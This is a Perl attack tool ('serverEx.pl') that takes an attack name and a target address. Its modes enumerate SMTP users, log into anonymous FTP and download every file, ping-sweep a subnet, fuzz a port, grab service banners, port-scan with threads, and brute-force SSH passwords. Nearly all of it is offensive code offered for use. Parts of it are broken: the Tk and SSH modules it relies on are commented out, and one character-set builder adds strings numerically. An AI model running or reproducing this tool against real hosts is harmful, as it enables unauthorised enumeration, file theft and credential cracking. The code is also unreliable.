#!/usr/bin/perl -w
#Written by Freak
#Usage:		file.pl <attack> <address>
use strict;
#use Tk;
use IO::Socket::INET;
use Net::FTP;
use Net::Ping;
use threads;
use LWP::UserAgent;
use HTTP::Request;
#use Net::SSH::Perl;
my($host, $smtpProbe, $anonFtp, $ipScan, $fuzz, $getBanners, $portScan, $convertToRadix, $bruteSSH);

$smtpProbe = sub{
	my($option, @fileData, $socket, $data, $attChoice);
	print "Enter probing method:\n\tVRFY -- 1\n\tEXPN -- 2\n\tRCPT TO -- 3\n";
	chomp($attChoice = <stdin>);
	print "Enter your prefrence:\n\twordlist -- 1\n\tbruteforce -- 2\n\n>>";
	chomp($option = <stdin>);
	if(lc($option) eq "1"){
		our $mw = new MainWindow;
		$mw->withdraw;
		print "Please open the desired wordlist...\n";
		sleep(2);
		open DATABASE, "<".$mw->getOpenFile() or die "Error: $!\n";
		chomp(@fileData = <DATABASE>);	
		close(DATABASE);
		$socket = new IO::Socket::INET (PeerHost => $host,
										PeerPort => '25',
										Proto => 'tcp',
										)or die "Error: $!\n";
		if($attChoice eq "1"){
			foreach(@fileData){
				$socket->send("VRFY ".$_);
				$socket->recv($data, 1024);
				print "\n$data" if($data =~ /\@/);
			}
		}elsif($attChoice eq "2"){
			foreach(@fileData){
				$socket->send("EXPN ".$_);
				$socket->recv($data, 1024);
				print "\n$data" if($data =~ /\@/);
			}
		}elsif($attChoice eq "3"){
			foreach(@fileData){
				$socket->send("RCPT TO: ".$_);
				$socket->recv($data, 1024);
				print "\n$data" if($data =~ /250/);
			}
		}else{
			print "Choice: $attChoice was invalid!\n";
		}
		$socket->close();
		print "\n---------------------------\nDone, all responses have been printed.\n";
	}elsif(lc($option) eq "2"){
		my($socket, $wordLength, @alphabet, $maxWords, $radix, $i, $k, @indices, @word, $lowercase, $uppercase, $numbers, $used, $data); 
		$socket = new IO::Socket::INET (PeerHost => $host,
										PeerPort => '25',
										Proto => 'tcp',
										)or die "Error: $!\n";
		print "Lowercase? [yes / no]\n";
		chomp($lowercase = <stdin>);
		$used += "abcdefghijklmnopqrstuvwxyz" if(lc($lowercase) eq "yes" or lc($lowercase) eq "y");
		print "Uppercase? [yes / no]\n";
		chomp($uppercase = <stdin>);
		$used += "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if(lc($uppercase) eq "yes" or lc($uppercase) eq "y");
		print "Numbers? [yes / no]\n";
		chomp($numbers = <stdin>);
		$used += "0123456789" if(lc($numbers) eq "yes" or lc($numbers) eq "y");
		@alphabet = split("", $used);
		print "Enter max name length:\n";
		chomp($wordLength = <stdin>);
		$radix = scalar(@alphabet);
		$maxWords = $radix**$wordLength;
		if($attChoice eq "1"){
			for(; $wordLength>0; $wordLength--){	#This bruteforce algorithm is a translation of Deque's wordlist generator! Credit goes to her.
				for $i (0..($maxWords - 1)){
					@indices = $convertToRadix->($radix, $i, $wordLength);
					for $k (0..($wordLength - 1)){
						push(@word, @alphabet[$indices[$k]]);
					}
					$socket->send("VRFY ".join("", @word));
					$socket->recv($data, 1024);
					print "\n$data" if($data =~ /\@/);
					@word = ();
				}
			}
		}elsif($attChoice eq "2"){
			for(; $wordLength>0; $wordLength--){	#This bruteforce algorithm is a translation of Deque's wordlist generator! Credit goes to her.
				for $i (0..($maxWords - 1)){
					@indices = $convertToRadix->($radix, $i, $wordLength);
					for $k (0..($wordLength - 1)){
						push(@word, @alphabet[$indices[$k]]);
					}
					$socket->send("EXPN ".join("", @word));
					$socket->recv($data, 1024);
					print "\n$data" if($data =~ /\@/);
					@word = ();
				}
			}
		}elsif($attChoice eq "3"){
			for(; $wordLength>0; $wordLength--){	#This bruteforce algorithm is a translation of Deque's wordlist generator! Credit goes to her.
				for $i (0..($maxWords - 1)){
					@indices = $convertToRadix->($radix, $i, $wordLength);
					for $k (0..($wordLength - 1)){
						push(@word, @alphabet[$indices[$k]]);
					}
					$socket->send("RCPT TO: ".join("", @word));
					$socket->recv($data, 1024);
					print "\n$data" if($data =~ /250/);
					@word = ();
				}
			}
		}else{
			print "Choice: $attChoice was invalid!\n";
		}
		$socket->close();
		print "\n---------------------------\nDone, all responses have been printed.\n";
	}else{
		print "Input: \"$option\" is an invalid option.\nOptions included:\n\t\"wordlist\"\n\t\"brute\"\n";
		sleep(1);
	}
};
$convertToRadix = sub{
	my(@indices, $rest);
	my($radix, $number, $wordLength) = @_;
	for(my $i=$wordLength-1; $i>=0; $i--){
		if($number>0){
			$rest = int(($number % $radix));
			$number /= $radix;
			unshift(@indices, $rest);
		}else{
			unshift(@indices, 0);
		}
	}
	return @indices
};
$anonFtp = sub{ #thank you http://www.secureftp-test.com/ for helping me test
	my $ftp = Net::FTP->new($host) or die "Error 1: $!\n";
	$ftp->login("anonymous",'blah@gmail.com') or die "Error 2: $!\n";
	foreach($ftp->ls){
		$ftp->get($_) or print "Error on file $_:\n$!";
	}
	print "\n---------------------------\nDone.\n";
};
$ipScan = sub{
	my($hostBegin, @children, $section);
	$section = 1;
	$hostBegin = $& if($host =~ /((.*?)\.){3}/);
	for(1..51){
		my $pid = fork();
		if ($pid) {
			push(@children, $pid);
		}elsif (!$pid){
			for(my $e=$section; $section<$e+5; $section++){
				my $ping = Net::Ping->new();
				print $hostBegin.$section."\n" if $ping->ping($hostBegin.$section, 2);
				$ping->close();
			}
			exit(0);
		}
		$section += 5;
	}
	foreach (@children) {
		waitpid($_, 0);
	}
};
$fuzz = sub{
	my($socket, $port, $protocol, $data, $continue, $option, @fileData, $newSock);
	print "Enter the port:\n";
	chomp($port = <stdin>);
	print "Enter the protocol:\n";
	chomp($protocol = <stdin>);
	$socket = new IO::Socket::INET (PeerHost => $host,
									PeerPort => $port,
									Proto => $protocol,
									)or die "Error: $!\n";
	print "Connection successful.\n";
	print "Option:\n\tManual -- 1\n\tWordlist -- 2\n";
	chomp($option = <stdin>);
	if($option eq "1"){
		do{
			print "Enter data to send:\n";
			chomp($data = <stdin>);
			$socket->send($data);
			$socket->recv($data, 1024);
			print "The server replied:\n$data\n\nWould you like to continue? [yes/no]\n";
			chomp($continue = <stdin>);
			if(lc($continue) eq "yes" or lc($continue) eq "y"){
				print "New socket? [yes/no]\n";
				chomp($newSock = <stdin>);
				if(lc($newSock) eq "yes" or lc($newSock) eq "y"){
					$fuzz->();
					$continue = "no";
				}
			}
		}while(lc($continue) eq "yes" or lc($continue) eq "y");
	}elsif($option eq "2"){
		our $mw = new MainWindow;
		$mw->withdraw;
		print "Please open the desired wordlist...\n";
		sleep(2);
		open DATABASE, "<".$mw->getOpenFile() or die "Error: $!\n";
		chomp(@fileData = <DATABASE>);	
		close(DATABASE);
		foreach(@fileData){
			$socket->send($_);
			$socket->recv($data, 1024);
			print "\n$data\n";
		}
	}else{
		print "Option: $option was unacceptable\n";
	}
	$socket->close();
};
$getBanners = sub{
	my($port, $socket, $banner, $data, $method, $userAgent, $response);
	print "Enter port to attack:\nSupported ports:\n\t21\n\t22\n\t25\n\t80\n";
	chomp($port = <stdin>);
	if($port eq "21" or $port eq "22" or $port eq "25"){
		$socket = new IO::Socket::INET (PeerHost => $host,
										PeerPort => $port,
										Proto => "tcp"
										) or die "Error: $!\n";
		$socket->recv($data, 1024);
		print "$data\n";
		$socket->close();
	}elsif($port eq "80"){
		print "Enter method:\n\tHEAD / HTTP/1.1 -- 1\n\tGET / HTTP/1.1 -- 2\n\tHEAD%00 -- 3\n\tPOST / HTTP/1.1 -- 4\n\tPurposeful 404 -- 5\n\tOPTIONS / HTTP/1.1 -- 6\n>>";
		chomp($method = <stdin>);
		$socket = new IO::Socket::INET (PeerHost => $host,
											PeerPort => $port,
											Proto => "tcp"
											) or die "Error: $!\n" unless $method eq "5";
		if($method eq "1"){
			$socket->send("HEAD / HTTP/1.1\r\nHost: $host\n\n");
			$socket->recv($data, 1024);
			print "$data\n";
			$socket->close();
		}elsif($method eq "2"){
			$socket->send("GET / HTTP/1.1\r\nHost: $host\n\n");
			$socket->recv($data, 1024);
			print "$data\n";
			$socket->close();
		}elsif($method eq "3"){
			$socket->send("HEAD%00\r\nHost: $host\n\n");
			$socket->recv($data, 1024);
			print "$data\n";
			$socket->close();
		}elsif($method eq "4"){
			$socket->send("POST / HTTP/1.1\r\nHost: $host\n\n");
			$socket->recv($data, 1024);
			print "$data\n";
			$socket->close();
		}elsif($method eq "5"){
			print "\nFor this method we assume you entered a URL for the host. ( www.example.com )\n";
			sleep(1);
			$userAgent = LWP::UserAgent->new();
			$response = $userAgent->request(HTTP::Request->new(GET=>"http://".$host."/ncKKns872/329nccszAA2/fnakcn.txt"));
			if(lc($response->content) =~ /\<i\>(.*?)\<\/i\>/  or  lc($response->content) =~ /\<address\>(.*?)\<\/address\>/){
				print "\nBanner:\n$1\n";
			}else{
				print "\n\nThe website probably has a custom 404 page, I was unable to find the banner...\nYou may try it yourself by going to $host"."/ncKKns872/329nccszAA2/fnakcn.txt or something similar\n";
			}
		}elsif($method eq "6"){
			$socket->send("OPTIONS / HTTP/1.1\r\nHost: $host\n\n");
			$socket->recv($data, 1024);
			print "$data\n";
			$socket->close();
		}else{
			print "Input: $method for method was invalid.\n";
		}
	}else{
		print "Input: $port for port number was not supported.\n";
		sleep(1);
	}
};
sub servicePorts{
	my($thisSection, $socket, $adder);
	$thisSection = shift;
	$adder = shift;
	for(my $e=$thisSection; $thisSection<$e+$adder; $thisSection++){
		my $check = eval {
		 	$socket = IO::Socket::INET->new(PeerAddr => $host, 
		 									PeerPort => $thisSection, 
		 									Proto => 'tcp'
		 									) or die "Error on $thisSection\n$!\n"
		};
		if($check){
			print "$thisSection\n";
			shutdown($socket, 2);
		}
	}
}
$portScan = sub{
	my($section, @threads, $choice, $port, $socket);
	$section = 1;
	print "Choose option:\n\tService ports (1024) -- 1\n\tIndividual port -- 2\n\tAll (65535) -- 3\n";
	chomp($choice = <stdin>);
	if($choice eq "1"){
		print "Open ports:\n";
		for(1..64){
			push (@threads, threads->create(\&servicePorts, $section, 16));
			$section += 16;
		}
		$_->join foreach @threads;
	}elsif($choice eq "2"){
		print "Enter port number:\n";
		chomp($port = <stdin>);
		if(eval {
		 	$socket = IO::Socket::INET->new(PeerAddr => $host, 
		 									PeerPort => $port, 
		 									Proto => 'tcp' 
		 									) or die "Error: $!\n";
		}){
			print "Port $port is open\n";
			$socket->close();
		}else{
			print "Port $port is closed\n";
		}
	}elsif($choice eq "3"){
		print "Warning this could take some time!\nOpen ports:\n";
		for(1..255){
			push (@threads, threads->create(\&servicePorts, $section, 257));
			$section += 257;
		}
		$_->join foreach @threads;
	}else{
		print "Choice: $choice was invalid!\n";
	}
};
$bruteSSH = sub{
	my($userOption, @fileData, $username, $i, @indices, $maxWords, $k, @word, @alphabet, $wordLength, $ssh, $lowercase, $uppercase, $numbers, $used, $radix);
	print "For username:\n\tWordlist -- 1\n\tKnown -- 2\n>>";
	chomp($userOption = <stdin>);
	print "Lowercase? [yes / no]\n";
	chomp($lowercase = <stdin>);
	$used .= "abcdefghijklmnopqrstuvwxyz" if(lc($lowercase) eq "yes" or lc($lowercase) eq "y");
	print "Uppercase? [yes / no]\n";
	chomp($uppercase = <stdin>);
	$used .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if(lc($uppercase) eq "yes" or lc($uppercase) eq "y");
	print "Numbers? [yes / no]\n";
	chomp($numbers = <stdin>);
	$used .= "0123456789" if(lc($numbers) eq "yes" or lc($numbers) eq "y");
	@alphabet = split("", $used);
	print "Enter max password length:\n";
	chomp($wordLength = <stdin>);
	$radix = scalar(@alphabet);
	$maxWords = $radix**$wordLength;
	if($userOption eq "1"){
		our $mw = new MainWindow;
		$mw->withdraw;
		print "Please open the desired wordlist...\n";
		sleep(2);
		open DATABASE, "<".$mw->getOpenFile() or die "Error: $!\n";
		chomp(@fileData = <DATABASE>);	
		close(DATABASE);
		foreach(@fileData){
			for $i (0..($maxWords - 1)){		#This bruteforce algorithm is a translation of Deque's wordlist generator! Credit goes to her.
				@indices = $convertToRadix->($radix, $i, $wordLength);
				for $k (0..($wordLength - 1)){
					push(@word, @alphabet[$indices[$k]]);
				}
				if(eval{$ssh->login($_, join("", @word))}){
					print "Success! Username: $_ Password: ".join("", @word)."\n";
					last;
				}
				@word = ();
			}
		}
		print "Done.\n"
	}elsif($userOption eq "2"){
		print "Enter the username:\n";
		chomp($username = <stdin>);
		for $i (0..($maxWords - 1)){		#This bruteforce algorithm is a translation of Deque's wordlist generator! Credit goes to her.
			@indices = $convertToRadix->($radix, $i, $wordLength);
			for $k (0..($wordLength - 1)){
				push(@word, @alphabet[$indices[$k]]);
			}
			if(eval{$ssh->login($username, join("", @word))}){
				print "Success! Username: $username Password: ".join("", @word)."\n";
				last;
			}
			@word = ();
		}
	}else{
		print "Username option: $userOption was invalid.\n";
	}
};

$host = $ARGV[1];
if(scalar @ARGV == 2){
	if   (lc($ARGV[0]) eq "smtp_probe")		{$smtpProbe->(1)}			#I liked how this looked when it was switch, but that was
	elsif(lc($ARGV[0]) eq "anonymous_ftp")	{$anonFtp->()}				#depricated so I just translated it in the same format.
	elsif(lc($ARGV[0]) eq "ip_scan")		{$ipScan->()}
	elsif(lc($ARGV[0]) eq "fuzz")			{$fuzz->()}
	elsif(lc($ARGV[0]) eq "get_banners")	{$getBanners->()}
	elsif(lc($ARGV[0]) eq "port_scan")		{$portScan->()}
	elsif(lc($ARGV[0]) eq "brute_ssh")		{$bruteSSH->()}
	else {
		print "Usage: serverEx.pl <attack> <address>\nAttacks include: (non-case sensative)\n\tSMTP_Probe\n\tAnonymous_FTP\n\tIP_Scan\n\tFuzz\n\tGet_Banners\n\tPort_Scan\n\tBrute_SSH\n\nProgram ending...\n"; 
		sleep(1);
	}
}else{
	print(scalar(@ARGV)."\n\n");
	print "Usage: serverEx.pl <attack> <address>\nAttacks include: (non-case sensative)\n\tSMTP_Probe\n\tAnonymous_FTP\n\tIP_Scan\n\tFuzz\n\tGet_Banners\n\tPort_Scan\n\tBrute_SSH\n\nProgram ending...\n"; 
	sleep(1);
}
